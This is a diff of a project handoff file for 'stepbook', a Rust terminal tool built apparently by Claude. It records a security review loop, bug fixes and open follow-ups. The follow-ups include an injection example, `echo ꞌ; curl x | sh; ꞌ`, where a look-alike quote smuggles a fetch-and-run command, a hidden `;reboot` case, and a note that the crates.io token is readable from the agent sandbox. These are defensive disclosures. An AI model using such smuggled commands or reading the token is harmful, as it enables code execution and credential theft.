@@ -20,7 +20,7 @@ Claude works on its own. It writes the code, the tests and the commit messages, 
 | 2 | Running blocks | Done, merged into `main` on 2026-11-11 |
 | 3 | Input and full-screen view | Done, merged into `main` on 2026-11-11 |
 | 4 | Log and reload | Done, merged into `main` on 2026-11-12 |
-| 5 | Migration | In progress on the branch `m5-migration`. Kamal signed off the plan on 2026-11-13 |
+| 5 | Migration | On the branch `m5-migration`: the review loop converged on 2026-11-13, and the release comes next. Kamal signed off the plan on 2026-11-13 |
 
 Kamal signed off the build order and the new dependencies on 2026-11-09.
 
@@ -399,6 +399,24 @@ Commits 2 to 5 are in, with one more of Claude's choice after the README: the cr
 - `/simplify`, with 4 cleanup agents, on 2026-11-13. Fixed: `about.toml` accepts only the 4 licences that the crates use; `install-updater`, a default, left `dist-workspace.toml`; CI runs `dist plan`, which fails if `release.yml` is stale; each target list points to the other. Skipped, with the reasons in the log of the review loop: cargo-about from a prebuilt binary or through mise on the release runners, and a CI check on Rust 1.92.
 - The README shows a capture of stepbook in tmux, and a watch script with grep in place of rg: grep is on every system. The script passed a check on a real log.
 
+### After the commits
+
+- The review loop, with a code reviewer (with the prose lens on the docs) and a security reviewer each round, on 2026-11-13, with no cap at Kamal's choice: the budget script reads a stale cache. Accepted blockers and should-fixes per round: 4, 1, 1, 2, 1, 1, 1, 1, 2, 1, 0. Round 11 found no blocker and no should-fix: the loop converged on 2026-11-13. Among the findings:
+  - The README and the changelog: the watch script counted the END lines of earlier runs, and took a dot in a name for any character; a renamed or unnamed block loses its output on a reload; only the control characters of the file show as vim shows them; the attestation check names the release workflow; the terminals that can still draw code in another way than bash reads it.
+  - The release plan, step 6: CI on the pushed branch before the publish, the publish before the README reaches `main`, immutable releases on and checked before the tag, CI on `main` before the tag, the attestations checked after it, and the steps that cannot be undone.
+  - Two bugs of the product, fixed in the code (spec 6.5): code escapes U+3248 to U+324F, which glibc and tmux draw 2 columns wide, and the 9 characters that tmux forces wide, such as U+261D, where ratatui counts 1 column. In tmux, eight of them before `;reboot x` hid `;reboot`. Scans of every code point with glibc 2.44 and tmux 3.8 found no other.
+  - The log of the loop, with its Decisions and Follow-ups, is `~/.cache/stepbook-review/m5/review-loop-log.md`.
+- `cargo mutants` on the Rust diff of the milestone: 2 mutants, 2 caught.
+- Follow-ups, outside this milestone, with the choices for Kamal first:
+  - The escape list is a snapshot of glibc 2.44, tmux 3.8 and unicode-width 0.2.3. A later glibc or tmux can draw a new character wide that unicode-width counts 1. Code could escape the characters that unicode-width does not know, but that needs Unicode data with no new crate: a choice for Kamal.
+  - Code does not escape the look-alikes of shell syntax, such as U+A78C `ꞌ` for `'` or U+FF03 `＃` for `#`: `echo ꞌ; curl x | sh; ꞌ` runs curl. A choice for Kamal.
+  - VTE knows mode 8 of ECMA-48 (BDSM): stepbook could send `CSI 8 l` at startup, so that VTE no longer reorders its rows. Not checked.
+  - The crates.io token in `~/.cargo/credentials.toml` can be read from the Bash sandbox of Claude. A keyring credential provider of cargo, or a deny rule of the sandbox, and a token scoped to stepbook would close that. Kamal's setup.
+  - A ruleset on `main`, as mdame has: no deletion, no force push.
+  - A CI check of `cargo check` on Rust 1.92, so that `rust-version` stays true.
+  - cargo-about builds and runs in the release job that can write attestations.
+  - The archives carry the licence texts of the crates, not those of musl and of the standard library of Rust. mdame does the same.
+
 Notes for the session that builds it:
 
 - mdame made the same release setup in its milestones 10 and 11. Its local logbook, `~/dev/github/mdame/docs/runbook.md`, lines 246 to 297, gives each command and its pitfalls:
@@ -415,7 +433,8 @@ Notes for the session that builds it:
 
 ## Next
 
-1. Milestone 5, on the branch `m5-migration`, at the end of the milestone: `cargo mutants` has no Rust code to change, so the review loop comes next. Then step 6 of the plan, the release, in its order: the push of the branch comes before the merge into `main`. A new session reads this file and spec 14.4, 15 and 16 first.
+1. Step 6 of the plan of milestone 5, the release of 0.1.0, in its order: Kamal pushes the branch `m5-migration` first, and CI must pass on it before the merge into `main`. A new session reads this file and spec 14.4, 15 and 16 first.
+2. Step 7: the runbook skill moves to stepbook. A draft of its new `SKILL.md` waits for the release.
 
 ## Open points
 
